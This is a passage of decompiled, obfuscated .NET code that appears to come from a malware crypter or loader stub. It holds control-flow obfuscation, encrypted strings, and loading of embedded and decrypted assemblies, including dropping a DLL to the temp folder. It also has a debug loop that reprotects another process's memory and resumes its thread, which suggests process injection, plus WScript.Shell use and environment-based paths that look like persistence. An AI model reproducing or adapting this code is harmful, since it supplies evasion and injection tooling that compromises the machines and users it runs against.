				while (int_0-- > 0)
				{
					class35_0.byte_0[class35_0.int_0++] = class35_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class21.smethod_18(class35_0, num, int_0, int_1);
		}
	}

	static Assembly smethod_44(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		Class26.Struct13 @struct = new Class26.Struct13(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "e2M2NTgzZDJlLWZjOWItNDg4YS04NWI1LWFhMzI0OTI1NzI2Yn0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{322b4bb1-09ba-4646-b118-a52672c4f153},e2M2NTgzZDJlLWZjOWItNDg4YS04NWI1LWFhMzI0OTI1NzI2Yn0=,[z]{322b4bb1-09ba-4646-b118-a52672c4f153}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		for (int i = 0; i < array.Length - 1; i += 2)
		{
			if (array[i] == text)
			{
				text2 = array[i + 1];
				break;
			}
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			for (int j = 0; j < array.Length - 1; j += 2)
			{
				if (array[j] == text)
				{
					text2 = array[j + 1];
					break;
				}
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				int num = text2.IndexOf(']');
				string text3 = text2.Substring(1, num - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(num + 1);
			}
			Assembly result;
			lock (Class26.dictionary_0)
			{
				if (Class26.dictionary_0.ContainsKey(text2))
				{
					result = Class26.dictionary_0[text2];
				}
				else
				{
					Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
					if (manifestResourceStream == null)
					{
						goto IL_02a9;
					}
					int num2 = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[num2];
					manifestResourceStream.Read(array2, 0, num2);
					if (flag)
					{
						array2 = Class21.smethod_91(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							int num3 = 5;
							string text5 = default(string);
							if (T1fpLDgQ4dlcokqoGbL())
							{
								FileStream fileStream = default(FileStream);
								while (true)
								{
									switch (num3)
									{
									case 0:
									case 5:
										Directory.CreateDirectory(text4);
										text5 = text4 + @struct.string_0 + ".dll";
										if (!File.Exists(text5))
										{
											goto case 2;
										}
										goto IL_0277;
									case 2:
										fileStream = File.OpenWrite(text5);
										fileStream.Write(array2, 0, array2.Length);
										goto default;
									default:
										fileStream.Close();
										num3 = 4;
										if (T1fpLDgQ4dlcokqoGbL())
										{
											continue;
										}
										goto IL_0277;
									case 3:
									case 4:
										break;
									case 6:
										goto IL_0277;
									}
									break;
								}
							}
							MoveFileEx(text5, null, 4);
							MoveFileEx(text4, null, 4);
							goto IL_0277;
							IL_0277:
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class26.dictionary_0[text2] = assembly;
					result = assembly;
				}
			}
			return result;
		}
		goto IL_02a9;
		IL_02a9:
		return null;
	}

	static void smethod_45(Class45 class45_0, Enum4 enum4_0, string string_0, string string_1)
	{
		class45_0.delegate20_0?.Invoke(class45_0, new EventArgs3(enum4_0, string_0, string_1));
	}

	static byte[] smethod_46(byte[] byte_0)
	{
		return Class21.smethod_149((byte[])null, 1, (byte[])null, byte_0);
	}

	static void smethod_47(Control0 control0_0)
	{
		while (true)
		{
			control0_0.timer_0.set_Enabled(false);
			while (true)
			{
				control0_0.image_0 = null;
				control0_0.bool_0 = false;
				while (true)
				{
					control0_0.string_0 = string.Empty;
					while (true)
					{
						((Control)control0_0).Refresh();
						((Control)control0_0).set_Height(16);
						if (Ht7G4Qg4FYYvPjn2sqY())
						{
						}
						switch (6)
						{
						case 0:
						case 2:
							goto end_IL_0003;
						case 1:
						case 5:
							goto end_IL_0040;
						case 4:
							goto end_IL_004d;
						case 6:
							return;
						}
						continue;
						end_IL_0003:
						break;
					}
					continue;
					end_IL_0040:
					break;
				}
				continue;
				end_IL_004d:
				break;
			}
		}
	}

	static int smethod_48(int int_0, Graphics graphics_0, Font font_0, string string_0)
	{
		return Size.Ceiling(graphics_0.MeasureString(string_0, font_0, int_0)).Height;
	}

	static IntPtr smethod_49(string string_0)
	{
		IEnumerator enumerator = default(IEnumerator);
		IntPtr baseAddress;
		try
		{
			enumerator = Process.GetCurrentProcess().Modules.GetEnumerator();
			while (enumerator.MoveNext())
			{
				ProcessModule processModule = (ProcessModule)enumerator.Current;
				if (!processModule.ModuleName!.ToLower().StartsWith(string_0))
				{
					continue;
				}
				baseAddress = processModule.BaseAddress;
				goto IL_0060;
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		return IntPtr.Zero;
		IL_0060:
		return baseAddress;
	}

	static void smethod_50(Class32.Class39.Class40 class40_0, Class32.Class39.Class40 class40_1)
	{
		int num = -1;
		int num2 = 0;
		while (num2 < class40_0.int_1)
		{
			int num3 = 1;
			int num4 = class40_0.byte_0[num2];
			int num5;
			int num6;
			if (num4 == 0)
			{
				num5 = 138;
				num6 = 3;
			}
			else
			{
				num5 = 6;
				num6 = 3;
				if (num != num4)
				{
					class40_1.short_0[num4]++;
					num3 = 0;
				}
			}
			num = num4;
			num2++;
			while (num2 < class40_0.int_1 && num == class40_0.byte_0[num2])
			{
				num2++;
				if (++num3 >= num5)
				{
					break;
				}
			}
			if (num3 < num6)
			{
				class40_1.short_0[num] += (short)num3;
			}
			else if (num != 0)
			{
				class40_1.short_0[16]++;
			}
			else if (num3 <= 10)
			{
				class40_1.short_0[17]++;
			}
			else
			{
				class40_1.short_0[18]++;
			}
		}
	}

	static bool smethod_51(Class32.Class33 class33_0)
	{
		switch (class33_0.int_4)
		{
		case 2:
		{
			if (class33_0.bool_0)
			{
				class33_0.int_4 = 12;
				return false;
			}
			int num = Class21.smethod_62(class33_0.class34_0, 3);
			if (num < 0)
			{
				return false;
			}
			Class21.smethod_4(class33_0.class34_0, 3);
			if (((uint)num & (true ? 1u : 0u)) != 0)
			{
				class33_0.bool_0 = true;
			}
			switch (num >> 1)
			{
			case 0:
				Class21.smethod_142(class33_0.class34_0);
				class33_0.int_4 = 3;
				break;
			case 1:
				class33_0.class36_0 = Class32.Class36.class36_0;
				class33_0.class36_1 = Class32.Class36.class36_1;
				class33_0.int_4 = 7;
				break;
			case 2:
				class33_0.class37_0 = new Class32.Class37();
				class33_0.int_4 = 6;
				break;
			}
			return true;
		}
		case 3:
			if ((class33_0.int_8 = Class21.smethod_62(class33_0.class34_0, 16)) < 0)
			{
				return false;
			}
			Class21.smethod_4(class33_0.class34_0, 16);
			class33_0.int_4 = 4;
			goto case 4;
		case 4:
		{
			int num2 = Class21.smethod_62(class33_0.class34_0, 16);
			if (num2 < 0)
			{
				return false;
			}
			Class21.smethod_4(class33_0.class34_0, 16);
			class33_0.int_4 = 5;
			goto case 5;
		}
		case 5:
		{
			int num3 = Class21.smethod_117(class33_0.class35_0, class33_0.class34_0, class33_0.int_8);
			class33_0.int_8 -= num3;
			if (class33_0.int_8 == 0)
			{
				class33_0.int_4 = 2;
				return true;
			}
			return !class33_0.class34_0.IsNeedingInput;
		}
		case 6:
			if (!Class21.smethod_25(class33_0.class37_0, class33_0.class34_0))
			{
				return false;
			}
			class33_0.class36_0 = Class21.smethod_141(class33_0.class37_0);
			class33_0.class36_1 = Class21.smethod_135(class33_0.class37_0);
			class33_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class21.smethod_156(class33_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static bool smethod_52(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_0.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_1.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static void smethod_53(Class45 class45_0, IWebProxy iwebProxy_0)
	{
		class45_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_54(IWebProxy iwebProxy_0, Class55 class55_0)
	{
		class55_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_55(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7)
	{
		Class21.smethod_122(exception_0, new object[8] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7 });
	}

	static int smethod_56(Class32.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static ICryptoTransform smethod_57(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_0, byte_1) : symmetricAlgorithm.CreateEncryptor(byte_0, byte_1);
	}

	static int smethod_58(Class32.Class36 class36_0, Class32.Class34 class34_0)
	{
		int num;
		int num3 = default(int);
		if ((num = Class21.smethod_62(class34_0, 9)) >= 0)
		{
			int num2 = 1;
			int num4 = default(int);
			int availableBits = default(int);
			if (T1fpLDgQ4dlcokqoGbL())
			{
				int int_ = default(int);
				int result = default(int);
				while (true)
				{
					switch (num2)
					{
					case 5:
						if ((num = Class21.smethod_62(class34_0, int_)) >= 0)
						{
							num3 = class36_0.short_0[num4 | (num >> 9)];
							Class21.smethod_4(class34_0, num3 & 0xF);
							num2 = 4;
							if (T1fpLDgQ4dlcokqoGbL())
							{
								continue;
							}
							goto case 7;
						}
						availableBits = class34_0.AvailableBits;
						goto case 6;
					case 0:
					case 1:
						if ((num3 = class36_0.short_0[num]) >= 0)
						{
							Class21.smethod_4(class34_0, num3 & 0xF);
							num2 = 2;
							if (Ht7G4Qg4FYYvPjn2sqY())
							{
							}
							continue;
						}
						num4 = -(num3 >> 4);
						int_ = num3 & 0xF;
						num2 = 5;
						if (T1fpLDgQ4dlcokqoGbL())
						{
							continue;
						}
						goto case 3;
					default:
						num2 = 6;
						if (!Ht7G4Qg4FYYvPjn2sqY())
						{
							continue;
						}
						goto case 5;
					case 2:
						return num3 >> 4;
					case 3:
					case 4:
						return num3 >> 4;
					case 6:
						num = Class21.smethod_62(class34_0, availableBits);
						break;
					case 8:
						break;
					case 7:
					case 9:
						return result;
					}
					break;
				}
			}
			num3 = class36_0.short_0[num4 | (num >> 9)];
			if ((num3 & 0xF) <= availableBits)
			{
				Class21.smethod_4(class34_0, num3 & 0xF);
				return num3 >> 4;
			}
			return -1;
		}
		int availableBits2 = class34_0.AvailableBits;
		num = Class21.smethod_62(class34_0, availableBits2);
		num3 = class36_0.short_0[num];
		if (num3 >= 0 && (num3 & 0xF) <= availableBits2)
		{
			Class21.smethod_4(class34_0, num3 & 0xF);
			return num3 >> 4;
		}
		return -1;
	}

	static bool smethod_59(bool bool_0, Class32.Class41 class41_0, bool bool_1)
	{
		if (class41_0.int_5 < 262)
		{
			goto IL_010a;
		}
		goto IL_028f;
		IL_028f:
		bool result;
		int num = default(int);
		bool flag = default(bool);
		int num2 = default(int);
		Class32.Class39 class39_2 = default(Class32.Class39);
		int int_3 = default(int);
		while (true)
		{
			Class32.Class39 class39_;
			byte[] byte_;
			int int_;
			if (class41_0.int_5 >= 262 || bool_0)
			{
				if (class41_0.int_5 == 0)
				{
					while (true)
					{
						IL_00f7:
						if (class41_0.bool_0)
						{
							Class21.smethod_6(class41_0.class39_0, class41_0.byte_0[class41_0.int_4 - 1] & 0xFF);
						}
						class41_0.bool_0 = false;
						class39_ = class41_0.class39_0;
						byte_ = class41_0.byte_0;
						int_ = class41_0.int_3;
						int int_2 = class41_0.int_4 - class41_0.int_3;
						Class21.smethod_88(int_, int_2, class39_, bool_1, byte_);
						class41_0.int_3 = class41_0.int_4;
						while (true)
						{
							result = false;
							if (T1fpLDgQ4dlcokqoGbL())
							{
								switch (7)
								{
								case 1:
									break;
								case 9:
									goto IL_00f7;
								case 12:
									goto end_IL_028f;
								case 11:
									goto IL_0128;
								case 8:
									goto IL_0177;
								case 10:
									goto IL_01a5;
								default:
									goto IL_01ac;
								case 16:
									goto IL_0234;
								case 5:
									goto end_IL_006d;
								case 4:
									goto IL_026a;
								case 17:
									goto IL_02a8;
								case 15:
									goto IL_02c4;
								case 3:
								case 13:
									goto IL_02ca;
								case 2:
								case 14:
									goto IL_02fb;
								case 0:
								case 7:
									goto IL_0322;
								}
								continue;
							}
							break;
							continue;
							end_IL_006d:
							break;
						}
						break;
					}
					goto IL_025c;
				}
				if (class41_0.int_4 >= 65274)
				{
					Class21.smethod_131(class41_0);
				}
				goto IL_0128;
			}
			goto IL_02a8;
			IL_02fb:
			Class21.smethod_88(int_, num, class39_, flag, byte_);
			class41_0.int_3 += num;
			result = !flag;
			goto IL_0322;
			IL_0192:
			if (num2 >= 3 && class41_0.int_2 <= num2)
			{
				goto IL_01a5;
			}
			if (class41_0.bool_0)
			{
				goto IL_0234;
			}
			goto IL_0255;
			IL_01a5:
			class39_2 = class41_0.class39_0;
			goto IL_01ac;
			IL_02a8:
			result = true;
			goto IL_0322;
			IL_01ac:
			int int_4 = class41_0.int_4 - 1 - int_3;
			Class21.smethod_87(int_4, num2, class39_2);
			num2 -= 2;
			do
			{
				class41_0.int_4++;
				class41_0.int_5--;
				if (class41_0.int_5 >= 3)
				{
					Class21.smethod_119(class41_0);
				}
			}
			while (--num2 > 0);
			class41_0.int_4++;
			class41_0.int_5--;
			class41_0.bool_0 = false;
			class41_0.int_2 = 2;
			goto IL_0278;
			IL_02c4:
			num--;
			goto IL_02ca;
			IL_0128:
			int_3 = class41_0.int_1;
			num2 = class41_0.int_2;
			if (class41_0.int_5 >= 3)
			{
				int num3 = Class21.smethod_119(class41_0);
				if (num3 != 0 && class41_0.int_4 - num3 <= 32506 && Class21.smethod_1(class41_0, num3) && class41_0.int_2 <= 5 && class41_0.int_2 == 3)
				{
					goto IL_0177;
				}
			}
			goto IL_0192;
			IL_02ca:
			flag = bool_1 && class41_0.int_5 == 0 && !class41_0.bool_0;
			class39_ = class41_0.class39_0;
			byte_ = class41_0.byte_0;
			int_ = class41_0.int_3;
			goto IL_02fb;
			IL_0278:
			if (!Class21.smethod_108(class41_0.class39_0))
			{
				continue;
			}
			num = class41_0.int_4 - class41_0.int_3;
			if (class41_0.bool_0)
			{
				goto IL_02c4;
			}
			goto IL_02ca;
			IL_0234:
			Class21.smethod_6(class41_0.class39_0, class41_0.byte_0[class41_0.int_4 - 1] & 0xFF);
			goto IL_0255;
			IL_0255:
			class41_0.bool_0 = true;
			goto IL_025c;
			IL_025c:
			class41_0.int_4++;
			goto IL_026a;
			IL_0177:
			if (class41_0.int_4 - class41_0.int_1 > 4096)
			{
				class41_0.int_2 = 2;
			}
			goto IL_0192;
			IL_026a:
			class41_0.int_5--;
			goto IL_0278;
			continue;
			end_IL_028f:
			break;
		}
		goto IL_010a;
		IL_010a:
		if (bool_0)
		{
			goto IL_028f;
		}
		result = false;
		goto IL_0322;
		IL_0322:
		return result;
	}

	static Exception smethod_60(object[] object_0, Exception exception_0)
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		try
		{
			if ((object)exception_0.GetType() == typeof(Exception) && exception_0.Message == "{report}")
			{
				exception_0 = exception_0.InnerException;
			}
			else
			{
				Class21.smethod_122(exception_0, object_0);
			}
			Class55.Handler.method_3(exception_0, bool_1: true, bool_2: false);
		}
		catch
		{
		}
		return (Exception)new SoapException(exception_0.Message, SoapException.ServerFaultCode);
	}

	static void smethod_61()
	{
		Process process = new Process();
		process.WaitForExit();
		if (!process.HasExited)
		{
			process.Kill();
		}
		string text = "3232dsd";
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WSfcfdfdsfdsfsffffffffffffffccript.Shell", ""));
		objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
		string text2 = "3232dsd";
	}

	static int smethod_62(Class32.Class34 class34_0, int int_0)
	{
		if (class34_0.int_2 < int_0)
		{
			if (class34_0.int_0 == class34_0.int_1)
			{
				return -1;
			}
			class34_0.uint_0 |= (uint)(((class34_0.byte_0[class34_0.int_0++] & 0xFF) | ((class34_0.byte_0[class34_0.int_0++] & 0xFF) << 8)) << class34_0.int_2);
			class34_0.int_2 += 16;
		}
		return (int)(class34_0.uint_0 & ((1 << int_0) - 1));
	}

	static bool smethod_63(string string_0)
	{
		Process[] processesByName = Process.GetProcessesByName(string_0);
		if (processesByName.Length > 0)
		{
			return true;
		}
		return false;
	}

	static int smethod_64(Class32.Class39 class39_0, int int_0)
	{
		int num = 0;
		while (int_0 >= 4)
		{
			num += 2;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	static bool smethod_65()
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Class21.smethod_82((Class55)new Class56());
			return true;
		}
		catch (SecurityException)
		{
			try
			{
				Application.EnableVisualStyles();
				string securityMessage = string.Format("{0} cannot initialize itself because some permissions are not granted.\n\nYou probably try to launch {0} in a partial-trust situation. It's usually the case when the application is hosted on a network share.\n\nYou need to run {0} in full-trust, or at least grant it the UnmanagedCode security permission.\n\nTo grant this application the required permission, contact your system administrator, or use the Microsoft .NET Framework Configuration tool.", "vf");
				Form1 form = new Form1(new EventArgs2(securityMessage, canContinue: false));
				((Form)form).set_ShowInTaskbar(true);
				((Form)form).ShowDialog();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.ToString(), string.Format("{0} Fatal Error", "vf"), (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			return false;
		}
	}

	static void smethod_66(Class32.Class38 class38_0, byte[] byte_0)
	{
		Class21.smethod_105(byte_0, class38_0.class41_0);
	}

	static Assembly[] smethod_67(Class46 class46_0)
	{
		try
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}
		catch
		{
			return new Assembly[1] { Class21.smethod_32() };
		}
	}

	static void smethod_68(int int_0, Class20.Struct0 struct0_0, uint uint_0)
	{
		Class20.Delegate11 @delegate = Class17.smethod_1<Class20.Delegate11>(Class21.smethod_109("Sk1N1W/kLlYPS5rz2GRFew=="), Class21.smethod_109("IZRPfMpaEgyR6ZDyXnOYiJx08Wzx4ZAZWC/PdMnfamo="));
		Class20.Delegate12 delegate2 = Class17.smethod_1<Class20.Delegate12>(Class21.smethod_109("Sk1N1W/kLlYPS5rz2GRFew=="), Class21.smethod_109("8E4kyZwlQ3AJzMDUyZVD4tOSfAQxWsmg1leG/X3uOQo="));
		Class20.Delegate13 delegate3 = Class17.smethod_1<Class20.Delegate13>(Class21.smethod_109("Sk1N1W/kLlYPS5rz2GRFew=="), Class21.smethod_109("zyY3vUJrmonBTUubJ9UCC5TzDHj71hXOJ3SGrrAKtvU="));
		Class20.Delegate14 delegate4 = Class17.smethod_1<Class20.Delegate14>(Class21.smethod_109("Sk1N1W/kLlYPS5rz2GRFew=="), Class21.smethod_109("WNauUailUhceWvNacXsoZYxTSn28xUnXdaZLyAiTtuU="));
		Class20.Delegate2 delegate5 = Class17.smethod_1<Class20.Delegate2>(Class21.smethod_109("Sk1N1W/kLlYPS5rz2GRFew=="), Class21.smethod_109("w0qEzcCa4McG97qE1cgACdQlprmDa117VKUX1amgZAo="));
		Class20.Delegate10 delegate6 = Class17.smethod_1<Class20.Delegate10>(Class21.smethod_109("pdd3zZ5lwXtj8hV1GKRfVw=="), Class21.smethod_109("qt4tHmTORXFlu08c+szp/A=="));
		checked
		{
			if (!@delegate((int)struct0_0.uint_0))
			{
				throw new Exception();
			}
			delegate3(KillOnExit: false);
			uint lpflOldProtect = 64u;
			bool flag = true;
			while (true)
			{
				if (flag)
				{
					Class20.Struct2 lpDebugEvent = default(Class20.Struct2);
					if (!delegate2(out lpDebugEvent, -1))
					{
						break;
					}
					switch (lpDebugEvent.enum1_0)
					{
					case Class20.Enum1.const_2:
						if (lpDebugEvent.Exception.struct5_0.uint_0 == 2147483649u)
						{
							delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								throw new Exception("VPEX REPROTECT FAILED");
							}
							break;
						}
						delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
						goto IL_027a;
					case Class20.Enum1.const_0:
						try
						{
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								throw new Exception("VPEX FIRST FAILED");
							}
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								throw new Exception("VPEX FIRST FAILED");
							}
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								throw new Exception("VPEX FIRST FAILED2");
							}
							ProjectData.ClearProjectError();
						}
						if (delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
						{
							uint SuspendCount = 0u;
							if (delegate6(struct0_0.intptr_1, out SuspendCount) != -1)
							{
								Thread.Sleep(1000);
								delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
								goto IL_027a;
							}
							throw new Exception("THREAD RESUME FAILED");
						}
						throw new Exception("VPEX FIRST FAILED2");
					default:
						delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
						goto IL_027a;
					case Class20.Enum1.const_3:
						{
							flag = false;
							delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 1073807364);
							goto IL_027a;
						}
						IL_027a:
						GC.Collect();
						break;
					}
					continue;
				}
				try
				{
					Process.GetProcessById((int)struct0_0.uint_0).Kill();
					Process.GetCurrentProcess().Kill();
					return;
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.ClearProjectError();
					return;
				}
			}
			throw new Exception();
		}
	}

	static void smethod_69(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5)
	{
		Class21.smethod_122(exception_0, new object[6] { object_0, object_1, object_2, object_3, object_4, object_5 });
	}

	static void smethod_70(Class54 class54_0)
	{
		try
		{
			Graphics val = ((Control)class54_0).CreateGraphics();
			try
			{
				string text = ((Control)class54_0).get_Text();
				int num = 3;
				int num2 = default(int);
				if (T1fpLDgQ4dlcokqoGbL())
				{
					Font font = default(Font);
					while (true)
					{
						switch (num)
						{
						case 0:
						case 3:
							font = ((Control)class54_0).get_Font();
							num = 4;
							if (!Ht7G4Qg4FYYvPjn2sqY())
							{
							}
							continue;
						case 1:
						case 4:
						{
							int width = ((Control)class54_0).get_Width();
							num2 = Class21.smethod_92(width, text, font, val);
							break;
						}
						case 5:
							goto IL_0066;
						}
						break;
					}
				}
				if (num2 <= 0)
				{
					return;
				}
				goto IL_0066;
				IL_0066:
				((Control)class54_0).set_Height(num2);
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	static void smethod_71(Class32.Class39 class39_0, int int_0)
	{
		Class21.smethod_138(class39_0.class40_2);
		while (true)
		{
			Class21.smethod_138(class39_0.class40_0);
			Class21.smethod_138(class39_0.class40_1);
			while (true)
			{
				Class21.smethod_21(class39_0.class42_0, class39_0.class40_0.int_1 - 257, 5);
				while (true)
				{
					Class21.smethod_21(class39_0.class42_0, class39_0.class40_1.int_1 - 1, 5);
					Class21.smethod_21(class39_0.class42_0, int_0 - 4, 4);
					int i = 0;
					if (Ht7G4Qg4FYYvPjn2sqY())
					{
					}
					switch (4)
					{
					case 1:
					case 3:
						goto end_IL_000d;
					case 5:
						goto end_IL_0066;
					case 4:
						for (; i < int_0; i++)
						{
							Class21.smethod_21(class39_0.class42_0, (int)class39_0.class40_2.byte_0[Class32.Class39.int_0[i]], 3);
						}
						Class21.smethod_115(class39_0.class40_0, class39_0.class40_2);
						goto case 6;
					case 6:
						Class21.smethod_115(class39_0.class40_1, class39_0.class40_2);
						return;
					}
					continue;
					end_IL_000d:
					break;
				}
				continue;
				end_IL_0066:
				break;
			}
		}
	}

	static void smethod_72(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8)
	{
		Class21.smethod_122(exception_0, new object[9] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8 });
	}

	static int smethod_73(int int_0, Graphics graphics_0, string string_0, Font font_0)
	{
		while (true)
		{
			Class58.Struct23 struct23_ = new Class58.Struct23(new Rectangle(0, 0, int_0, 10000));
			while (true)
			{
				int int_ = 3088;
				IntPtr hdc = graphics_0.GetHdc();
				IntPtr intptr_ = font_0.ToHfont();
				IntPtr intptr_2 = SelectObject(hdc, intptr_);
				while (true)
				{
					DrawText(hdc, string_0, -1, ref struct23_, int_);
					SelectObject(hdc, intptr_2);
					while (true)
					{
						graphics_0.ReleaseHdc(hdc);
						if (Ht7G4Qg4FYYvPjn2sqY())
						{
						}
						switch (6)
						{
						case 2:
						case 4:
							goto end_IL_0003;
						case 5:
							goto end_IL_0039;
						case 0:
						case 1:
							goto end_IL_004f;
						case 6:
							return struct23_.int_3 - struct23_.int_1;
						}
						continue;
						end_IL_0003:
						break;
					}
					continue;
					end_IL_0039:
					break;
				}
				continue;
				end_IL_004f:
				break;
			}
		}
	}

	static int smethod_74(Class46.Struct22 struct22_0, Class46 class46_0)
	{
		string key = struct22_0.struct21_0.string_0.ToUpper();
		if (class46_0.dictionary_3.ContainsKey(key))
		{
			return class46_0.dictionary_3[key];
		}
		int count = class46_0.list_2.Count;
		class46_0.list_2.Add(struct22_0.struct21_0);
		class46_0.dictionary_3.Add(key, count);
		return count;
	}

	static void smethod_75(Class45 class45_0, Enum4 enum4_0, string string_0)
	{
		Class21.smethod_45(class45_0, enum4_0, string_0, string.Empty);
	}

	static bool smethod_76(object[] object_0)
	{
		int num = 1;
		do
		{
			if (!Class21.smethod_8(object_0))
			{
				num = checked(num + 1);
				continue;
			}
			return true;
		}
		while (num <= 5);
		return false;
	}

	static void smethod_77(Exception exception_0)
	{
		if (exception_0 == null || !(exception_0 is SecurityException) || !(Class55.string_0 == "1") || !Class55.Handler.method_2((SecurityException)exception_0))
		{
			Class55.Handler.method_3(exception_0, bool_1: false, bool_2: false);
		}
	}

	static void smethod_78(Class32.Stream0 stream0_0, int int_0)
	{
		Class21.smethod_20(stream0_0, int_0);
		Class21.smethod_20(stream0_0, int_0 >> 16);
	}

	static void smethod_79(int int_0, Class32.Class42 class42_0)
	{
		class42_0.byte_0[class42_0.int_1++] = (byte)int_0;
		class42_0.byte_0[class42_0.int_1++] = (byte)(int_0 >> 8);
	}

	static string smethod_80(string string_0)
	{
		if (string_0.StartsWith("\"<RSAKeyValue>") && string_0.EndsWith("</RSAKeyValue>\""))
		{
			return "*** Information not reported for security reasons ***";
		}
		return string_0;
	}

	static void smethod_81()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text6 = default(string);
		string text7 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				object executablePath;
				string text4;
				string text5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 413:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0033;
						case 5:
							goto IL_004d;
						case 6:
							goto IL_007a;
						case 7:
							goto IL_0083;
						case 8:
							goto IL_008c;
						case 9:
							goto IL_00af;
						case 10:
							goto IL_00bf;
						case 11:
							goto IL_00d4;
						case 12:
							goto IL_00e3;
						case 13:
							goto IL_00f0;
						case 14:
							goto IL_00ff;
						case 15:
							goto IL_011c;
						case 16:
						case 17:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 18:
						case 19:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_011c:
					num = 15;
					Conversion.Int(3405);
					break;
					IL_0008:
					num = 2;
					text = "hhhhhhhhhheeeee";
					goto IL_0011;
					IL_0011:
					num = 3;
					text2 = Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_0033;
					IL_0033:
					num = 4;
					if (Operators.CompareString(text, Class21.smethod_154("SYgwSIDqN1G8QkK/jvXMGw=="), false) != 0)
					{
						goto end_IL_0000_3;
					}
					goto IL_004d;
					IL_004d:
					num = 5;
					text3 = "" + Interaction.Environ(Class21.smethod_154("5g+BxFHXkdTcEM3cEGgk0A==")) + Class21.smethod_154("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
					goto IL_007a;
					IL_007a:
					num = 6;
